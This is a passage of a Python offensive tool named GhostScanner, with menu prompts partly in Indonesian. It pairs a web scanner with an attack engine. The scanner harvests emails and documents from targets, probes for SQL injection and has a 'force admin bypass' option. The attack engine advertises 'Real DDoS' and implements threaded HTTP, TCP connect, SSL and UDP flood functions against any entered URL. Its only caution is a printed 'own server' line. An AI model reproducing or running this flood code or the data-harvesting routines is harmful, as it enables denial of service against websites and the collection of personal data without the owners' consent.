## 3. TEMUAN HIGH & MEDIUM
## 4. ANALISIS DATA SENSITIF (UU PDP/GDPR)
## 5. REKOMENDASI PERBAIKAN (PRIORITAS)
## 6. ACTION PLAN 30-60-90 HARI
## 7. SARAN PENGUJIAN LANJUTAN
## 8. KRITIK KONSTRUKTIF & BEST PRACTICES
"""
        for attempt in range(3):
            try:
                r = requests.post(
                    f"{AI_BASE_URL}/chat/completions",
                    headers={'Authorization': f'Bearer {AI_API_KEY}', 'Content-Type': 'application/json'},
                    json={"model": AI_MODEL, "messages": [{"role": "user", "content": prompt}], "max_tokens": 4000},
                    timeout=180
                )
                if r.status_code == 200:
                    return r.json()['choices'][0]['message']['content']
            except Exception as e:
                Console().print(f"[yellow]AI attempt {attempt+1}: {str(e)[:100]}[/yellow]")
                time.sleep(5)
        return "AI Analysis failed."

    # ========== PDF ==========
    def _generate_pdf(self, results, output_path="report.pdf"):
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font('Arial', 'B', 16)
                    self.cell(0, 10, f'{TOOLS_NAME} v{TOOLS_VERSION} - Report', ln=True, align='C')
                    self.ln(5)
                def footer(self):
                    self.set_y(-15); self.set_font('Arial', 'I', 8)
                    self.cell(0, 10, f'Page {self.page_no()}', align='C')

            pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
            pdf.cell(0, 8, f'Target: {results["target"]}', ln=True)
            pdf.cell(0, 8, f'Category: {results.get("domain_category","N/A")}', ln=True)
            pdf.cell(0, 8, f'Time: {results["timestamp"]}', ln=True)
            pdf.cell(0, 8, f'Duration: {results["scan_duration"]:.2f}s', ln=True)
            pdf.ln(3)
            pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Summary', ln=True)
            pdf.set_font('Arial', '', 11); s = results["summary"]
            pdf.cell(0, 8, f'Total: {s["total"]} | Critical: {s["critical"]} | High: {s["high"]} | Medium: {s["medium"]} | Low: {s["low"]}', ln=True)
            pdf.ln(3)
            pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Vulnerabilities', ln=True)
            pdf.set_font('Arial', '', 9)
            for vt, vs in results["vulnerabilities"].items():
                if vs:
                    pdf.set_font('Arial', 'B', 10); pdf.cell(0, 6, f'[{vt}] {len(vs)} finding(s)', ln=True)
                    pdf.set_font('Arial', '', 8)
                    for v in vs[:3]:
                        pdf.multi_cell(0, 5, f"  Param: {v.get('param','N/A')} | Payload: {str(v.get('payload','N/A'))[:50]} | Risk: {v.get('risk')}")
                    pdf.ln(1)
            pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'Sensitive Data', ln=True)
            pdf.set_font('Arial', '', 9)
            for k, v in results["sensitive_data"].items():
                if v: pdf.multi_cell(0, 5, f'{k.upper()}: {", ".join(str(x) for x in v[:10])}')
            if results.get("ai_analysis"):
                pdf.add_page(); pdf.set_font('Arial', 'B', 13); pdf.cell(0, 8, 'AI Analysis', ln=True)
                pdf.set_font('Arial', '', 9)
                pdf.multi_cell(0, 6, results["ai_analysis"].replace('**','').replace('###','>>>')[:8000])
            pdf.output(output_path)
            Console().print(f"[green]PDF: {os.path.abspath(output_path)}[/green]")
        except Exception as e:
            Console().print(f"[yellow]PDF generation error: {e}[/yellow]")

    def _save_sensitive_data(self, all_s):
        combined = {}
        for s in all_s:
            for k, v in s.items(): combined.setdefault(k, []).extend(v)
        ts = int(time.time())
        for k, v in combined.items():
            if v:
                uniq = list(set(str(x) for x in v if x))
                if uniq:
                    fn = f"{self.sensitive_folder}/{k}_{ts}.txt"
                    with open(fn, 'w', encoding='utf-8') as f: f.write('\n'.join(uniq))
                    self.results_scan["sensitive_data"][k] = uniq[:20]

    def _generate_sensitive_pdf(self, data_type, data_list, target, output_dir):
        if not data_list: return None
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font('Arial', 'B', 14)
                    self.cell(0, 10, f'{data_type.upper()} - {TOOLS_NAME}', ln=True, align='C')
                    self.ln(3)
                def footer(self):
                    self.set_y(-15); self.set_font('Arial', 'I', 8)
                    self.cell(0, 10, f'Target: {target}', align='C')

            pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
            pdf.cell(0, 8, f'Target: {target}', ln=True)
            pdf.cell(0, 8, f'Data Type: {data_type.upper()}', ln=True)
            pdf.cell(0, 8, f'Total: {len(data_list)}', ln=True)
            pdf.ln(5); pdf.set_font('Arial', 'B', 12); pdf.cell(0, 8, 'DATA:', ln=True)
            pdf.set_font('Arial', '', 9)
            for i, item in enumerate(data_list[:500], 1):
                text = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
                pdf.multi_cell(0, 5, f'{i}. {text[:300]}')
            os.makedirs(output_dir, exist_ok=True)
            filename = os.path.join(output_dir, f'{data_type}_{int(time.time())}.pdf')
            pdf.output(filename)
            Console().print(f"[green]✓ PDF {data_type}: {os.path.abspath(filename)}[/green]")
            return filename
        except Exception as e:
            Console().print(f"[yellow]Sensitive PDF error: {e}[/yellow]")
            return None

    def _generate_all_sensitive_pdfs(self, sensitive_data, target):
        pdf_dir = os.path.join(self.sensitive_folder, 'pdfs')
        os.makedirs(pdf_dir, exist_ok=True)
        pdfs = []
        for key, values in sensitive_data.items():
            if values and isinstance(values, list) and len(values) > 0:
                fp = self._generate_sensitive_pdf(key, values, target, pdf_dir)
                if fp: pdfs.append(fp)
        self.results_scan["sensitive_pdfs"] = pdfs

    # ========== EXTERNAL TOOLS ==========
    def _run_external_tool(self, cmd, timeout=300):
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=timeout, text=True,
                                    encoding='utf-8', errors='ignore')
            return result.stdout or "" if result.returncode == 0 or result.stdout else result.stderr or ""
        except: return ""

    def _run_subfinder(self, domain):
        if not is_tool_available('subfinder'): return []
        Console().print("[cyan]🔥 Subfinder...[/cyan]")
        output = self._run_external_tool(['subfinder', '-d', domain, '-silent'], timeout=120)
        subs = [l.strip() for l in output.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Subfinder: {len(subs)}[/green]")
        return subs

    def _run_nuclei(self, target):
        findings = []
        if not is_tool_available('nuclei'): return findings
        Console().print("[cyan]🔥 Nuclei...[/cyan]")
        output = self._run_external_tool(['nuclei', '-u', target, '-severity', 'critical,high,medium',
                                          '-silent', '-jsonl', '-timeout', '10'], timeout=300)
        for line in output.strip().split('\n'):
            if not line.strip(): continue
            try:
                data = json.loads(line)
                findings.append({
                    "type": f"Nuclei: {data.get('info',{}).get('name','Unknown')}",
                    "param": "N/A", "payload": data.get('matched-at','N/A'),
                    "evidence": data.get('info',{}).get('description','Nuclei')[:200],
                    "risk": data.get('info',{}).get('severity','MEDIUM').upper(),
                    "confidence": 90,
                    "poc": {
                        "url": data.get('matched-at', target),
                        "curl": data.get('curl-command', f"curl -k \"{target}\""),
                        "response": str(data.get('extracted-results',''))[:300],
                        "statusCode": 200, "timeDiff": "N/A", "verified": True
                    }
                })
            except: continue
        Console().print(f"[green]✓ Nuclei: {len(findings)}[/green]")
        return findings

    def _run_nmap(self, target):
        findings = []
        if not is_tool_available('nmap'): return findings
        Console().print("[cyan]🔥 Nmap...[/cyan]")
        try:
            domain = urlparse(target).netloc.split(':')[0]
            output = self._run_external_tool(['nmap', '-sV', '-T4', '--top-ports', '100', '-oX', '-', domain], timeout=300)
            if output:
                import xml.etree.ElementTree as ET
                xs = output.find('<?xml')
                if xs >= 0:
                    try:
                        root = ET.fromstring(output[xs:])
                        for host in root.findall('host'):
                            for port in host.findall('.//port'):
                                port_id = port.get('portid')
                                state = port.find('state')
                                service = port.find('service')
                                if state is not None and state.get('state') == 'open':
                                    svc_name = service.get('name','unknown') if service is not None else 'unknown'
                                    findings.append({
                                        "type": f"Nmap: Open Port {port_id}", "param": "N/A",
                                        "payload": str(port_id), "evidence": f"Service: {svc_name}",
                                        "risk": "MEDIUM" if port_id in ['22','3306','5432','6379','27017'] else "INFO",
                                        "confidence": 95,
                                        "poc": {
                                            "url": f"{domain}:{port_id}",
                                            "curl": f"nmap -sV -p {port_id} {domain}",
                                            "response": svc_name, "statusCode": 200,
                                            "timeDiff": "N/A", "verified": True
                                        }
                                    })
                    except: pass
        except: pass
        return findings

    # ========== MAIN SCAN ==========
    def run_scan(self, target):
        self.results_scan["target"] = target
        self.results_scan["domain"] = urlparse(target).netloc
        self.results_scan["domain_category"] = self._classify_domain(self.results_scan["domain"])
        self.results_scan["timestamp"] = datetime.now().isoformat()
        start = time.time()
        console = Console()
        console.print(f"[bold red]🚀 {TOOLS_NAME} v{TOOLS_VERSION} on {target}[/bold red]")
        console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")

        # === ROBUST ACCESS: Try multiple methods ===
        console.print("[yellow]Accessing target (multi-layer bypass)...[/yellow]")
        resp = self._smart_request(target, timeout=25)

        if not resp and CURL_CFFI_AVAILABLE:
            console.print("[yellow]Fallback: curl-cffi direct...[/yellow]")
            try:
                r = curl_requests.get(target, impersonate="chrome120", timeout=25)
                resp = CompatResp(r)
                console.print(f"[green]Fallback success: {resp.status_code}[/green]")
            except Exception as e:
                console.print(f"[red]Fallback failed: {str(e)[:100]}[/red]")

        if not resp:
            console.print("[red]⚠ Target heavily protected. Skipping access, continuing with partial scan.[/red]")
            html = ""
        else:
            html = resp.text

        console.print("[bold cyan]═══ INTERNAL CHECKS ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["robots"] = self._check_robots(target)
        self.results_scan["vulnerabilities"]["sensitive_files"] = self._check_sensitive_files(target)
        self.results_scan["vulnerabilities"]["security_headers"] = self._check_security_headers(target)
        self.results_scan["vulnerabilities"]["waf_detection"] = self._check_waf(target)
        self.results_scan["vulnerabilities"]["deface"] = self._check_deface(target)
        self.results_scan["vulnerabilities"]["ddos_vulnerability"] = self._check_ddos_vulnerability(target)

        forms = self._extract_forms(html, target)
        all_p = {}
        all_p.update(self._extract_params_from_url(target))
        for form in forms:
            if form['method'] == 'GET':
                for i in form['inputs']: all_p[i['name']] = '1'
        if not all_p:
            for c in self.common_params[:30]: all_p[c] = '1'
        params = dict(list(all_p.items())[:100])

        self.results_scan["ports"] = self._scan_ports(self.results_scan["domain"])

        all_s = [self._extract_sensitive_data(html)]
        self._save_sensitive_data(all_s)

        # user-scanner OSINT
        emails = self.results_scan["sensitive_data"].get("emails", [])
        for email in emails[:3]:
            osint = self._run_user_scanner(email)
            if osint:
                self.results_scan["vulnerabilities"]["user_scanner_osint"].extend(osint)

        # Download sensitive documents
        pdf_links = self.results_scan["sensitive_data"].get("pdf_links", [])
        if pdf_links:
            console.print("[bold cyan]═══ DOWNLOADING SENSITIVE DOCS ═══[/bold cyan]")
            downloaded = self._download_sensitive_documents(pdf_links, target)
            self.results_scan["downloaded_docs"] = downloaded

        console.print("[bold cyan]═══ VULNERABILITY SCAN ═══[/bold cyan]")
        self.results_scan["vulnerabilities"]["sql_injection"] = self._scan_sql(target, params)

        if self.use_tools:
            console.print("[bold magenta]═══ EXTERNAL TOOLS ═══[/bold magenta]")
            subs = self._run_subfinder(self.results_scan["domain"])
            self.results_scan["external"]["subdomains"] = subs
            self.results_scan["vulnerabilities"]["nuclei"] = self._run_nuclei(target)
            self.results_scan["vulnerabilities"]["nmap"] = self._run_nmap(target)

        # Summary
        all_f = []
        for cat, items in self.results_scan["vulnerabilities"].items():
            if isinstance(items, list): all_f.extend(items)
        self.results_scan["summary"] = {
            "total": len(all_f),
            "critical": len([f for f in all_f if f.get('risk') == 'CRITICAL']),
            "high": len([f for f in all_f if f.get('risk') == 'HIGH']),
            "medium": len([f for f in all_f if f.get('risk') == 'MEDIUM']),
            "low": len([f for f in all_f if f.get('risk') == 'LOW'])
        }
        self.results_scan["scan_duration"] = time.time() - start
        self.results_scan["validated"] = True

        if self.ai:
            self.results_scan["ai_analysis"] = self._ai_analysis(all_f, target)

        self._generate_all_sensitive_pdfs(self.results_scan["sensitive_data"], target)

        self._display(all_f)

        jf = f"{self.result_folder}/scan_{int(time.time())}.json"
        with open(jf, 'w', encoding='utf-8') as f: json.dump(self.results_scan, f, indent=2, ensure_ascii=False)
        console.print(f"[green]JSON: {os.path.abspath(jf)}[/green]")
        if self.pdf:
            self._generate_pdf(self.results_scan, f"{self.result_folder}/report_{int(time.time())}.pdf")

    def _display(self, findings):
        c = Console()
        if not findings: c.print("[green]No vulnerabilities found.[/green]"); return
        t = Table(title="Findings", box=box.ROUNDED)
        for col in ["Type", "Param", "Risk", "Verified"]: t.add_column(col)
        for f in findings[:30]:
            v = "OK" if f.get('poc', {}).get('verified') else "?"
            t.add_row(f.get('type','Unknown')[:40], str(f.get('param','N/A'))[:20],
                      f.get('risk','INFO'), v)
        c.print(t)

# ============================================================
# ATTACK ENGINE
# ============================================================
class AttackEngine:
    def __init__(self, target, threads=200, duration=30, method='http'):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.method = method
        self.running = False
        self.stats = {'success': 0, 'fail': 0}
        self.lock = threading.Lock()
        try:
            self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True})
        except:
            self.scraper = requests.Session()

    def start(self):
        c = Console()
        c.print(f"[bold red]🔥 REAL ATTACK: {self.method.upper()}[/bold red]")
        c.print(f"[yellow]Target: {self.target} | Threads: {self.threads} | Duration: {self.duration}s[/yellow]")
        c.print("[bold red]⚠ Only use on YOUR OWN server![/bold red]\n")
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._http_flood if self.method in ['http','all'] else
                              self._syn_flood if self.method == 'syn' else
                              self._ssl_reneg if self.method == 'ssl' else self._udp_flood,
                              daemon=True).start()
        start = time.time()
        try:
            while time.time() - start < self.duration:
                time.sleep(2)
                with self.lock:
                    c.print(f"[cyan]⚡ Success: {self.stats['success']} | Fail: {self.stats['fail']} | {int(time.time()-start)}s/{self.duration}s[/cyan]")
        except KeyboardInterrupt:
            c.print("[yellow]Stopped.[/yellow]")
        self.running = False
        c.print(f"\n[bold green]✓ Attack finished.[/bold green]")

    def _http_flood(self):
        while self.running:
            try:
                h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*', 'Connection': 'keep-alive'}
                self.scraper.get(self.target, headers=h, timeout=3)
                with self.lock: self.stats['success'] += 1
            except:
                with self.lock: self.stats['fail'] += 1
            time.sleep(random.uniform(0.001, 0.01))

    def _syn_flood(self):
        try:
            d = self.target.replace('https://','').replace('http://','').split('/')[0]
            port = 443 if 'https' in self.target else 80
        except: return
        while self.running:
            try:
                ip = socket.gethostbyname(d)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + d.encode() + b"\r\n\r\n")
                s.close()
                with self.lock: self.stats['success'] += 1
            except:
                with self.lock: self.stats['fail'] += 1
            time.sleep(random.uniform(0.001, 0.005))

    def _ssl_reneg(self):
        try: d = self.target.replace('https://','').replace('http://','').split('/')[0]
        except: return
        while self.running:
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
                s.connect((d, 443))
                ss = ctx.wrap_socket(s, server_hostname=d)
                for _ in range(10): ss.send(b"R" * 8192)
                ss.close()
                with self.lock: self.stats['success'] += 1
            except:
                with self.lock: self.stats['fail'] += 1
            time.sleep(random.uniform(0.01, 0.05))

    def _udp_flood(self):
        try: d = self.target.replace('https://','').replace('http://','').split('/')[0]
        except: return
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = os.urandom(1400)
                for _ in range(10):
                    s.sendto(payload, (d, random.choice([53,123,161,389,1900])))
                s.close()
                with self.lock: self.stats['success'] += 1
            except:
                with self.lock: self.stats['fail'] += 1
            time.sleep(0.001)

# ============================================================
# MENU
# ============================================================
def show_menu():
    Console().print(Panel(f"""
[bold cyan]{TOOLS_NAME} v{TOOLS_VERSION} - MENU[/bold cyan]

[1] SCAN (Unified)     - Full automated scan
[2] TOOLS (External)   - External tools integration
[3] ATTACK (Real DDoS) - Real DDoS/DoS attack
[4] HELP               - Show help
[0] EXIT
""", border_style="cyan"))
    return Console().input("[bold green]Pilih menu: [/bold green]").strip()

# ============================================================
# MAIN
# ============================================================
def main():
    if '-h' in sys.argv or '--help' in sys.argv: show_help()

    if len(sys.argv) == 1:
        while True:
            choice = show_menu()
            if choice in ("0", "exit"): sys.exit(0)
            elif choice == "1":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                ai = Console().input("Enable AI? [y/N]: ").strip().lower() == 'y'
                pdf = Console().input("Generate PDF? [y/N]: ").strip().lower() == 'y'
                tools = Console().input("Run external tools? [y/N]: ").strip().lower() == 'y'
                force_admin = Console().input("Force admin bypass? [y/N]: ").strip().lower() == 'y'
                scanner = GhostScanner(target=target, ai=ai, pdf=pdf, use_tools=tools,
                                       force_admin=force_admin, scan=True)
                try: scanner.run_scan(target)
                except KeyboardInterrupt: Console().print("[red]Interrupted.[/red]")
                except Exception as e: Console().print(f"[red]Error: {e}[/red]")
                input("\n[Press Enter to continue]")
            elif choice == "2":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                scanner = GhostScanner(target=target, use_tools=True)
                try: scanner.run_scan(target)
                except Exception as e: Console().print(f"[red]Error: {e}[/red]")
                input("\n[Press Enter to continue]")
            elif choice == "3":
                target = Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                if not target: continue
                method = Console().input("Method [dos/ddos/syn/ssl-reneg/udp]: ").strip().lower()
                threads = int(Console().input("Threads [200]: ").strip() or "200")
                duration = int(Console().input("Duration [30s]: ").strip() or "30")
                m = 'http'
                if method == 'dos': m = 'http'
                elif method == 'ddos': m = 'all'
                elif method == 'syn': m = 'syn'
                elif method in ['ssl-reneg','ssl']: m = 'ssl'
                elif method == 'udp': m = 'udp'
                AttackEngine(target, threads=threads, duration=duration, method=m).start()
                input("\n[Press Enter to continue]")
            elif choice == "4": show_help()
            else:
                Console().print("[red]Invalid choice![/red]")
                time.sleep(1)
        return

    p = argparse.ArgumentParser(description=f"{TOOLS_NAME} v{TOOLS_VERSION}", add_help=False)
    p.add_argument('-u', '--url')
    p.add_argument('-o', '--output', default='results.json')
    p.add_argument('-v', '--verbose', action='store_true')
    p.add_argument('--proxy-list'); p.add_argument('--validate-proxy', action='store_true')
    p.add_argument('--no-proxy', action='store_true'); p.add_argument('--quick', action='store_true')
    p.add_argument('--pdf', action='store_true'); p.add_argument('--ai', action='store_true')
    p.add_argument('--delay', type=float, default=0.5)
    p.add_argument('--force-admin', action='store_true')
    p.add_argument('--tools', action='store_true')
    p.add_argument('--scan', action='store_true')
    p.add_argument('--dos', action='store_true'); p.add_argument('--ddos', action='store_true')
    p.add_argument('--syn', action='store_true'); p.add_argument('--ssl-reneg', action='store_true')
    p.add_argument('--udp', action='store_true')
    p.add_argument('--threads', type=int, default=200)
    p.add_argument('--duration', type=int, default=30)
    args = p.parse_args()

    clear_screen(); show_banner()

    if not args.url:
        try:
            args.url = Console().input("[bold cyan]Enter target URL: [/bold cyan]").strip()
            if not args.url:
                Console().print("[red]No target. Exiting.[/red]"); sys.exit(1)
        except (KeyboardInterrupt, EOFError):
            Console().print("\n[yellow]Cancelled.[/yellow]"); sys.exit(0)

    attack = args.dos or args.ddos or args.syn or args.ssl_reneg or args.udp
    if attack:
        m = 'http'
        if args.ddos: m = 'all'
        elif args.syn: m = 'syn'
        elif args.ssl_reneg: m = 'ssl'
        elif args.udp: m = 'udp'
        AttackEngine(args.url, threads=args.threads, duration=args.duration, method=m).start()
    else:
        scanner = GhostScanner(
            target=args.url, use_proxy=not args.no_proxy, proxy_file=args.proxy_list,
            validate_proxy=args.validate_proxy, quick=args.quick, pdf=args.pdf,
            ai=args.ai, delay=args.delay, force_admin=args.force_admin,
            use_tools=args.tools, scan=args.scan
        )
        try: scanner.run_scan(args.url)
        except KeyboardInterrupt: Console().print("[red]Interrupted.[/red]")
        except Exception as e:
            Console().print(f"[red]Error: {e}[/red]")
            import traceback; traceback.print_exc()

if __name__ == "__main__":
    main()
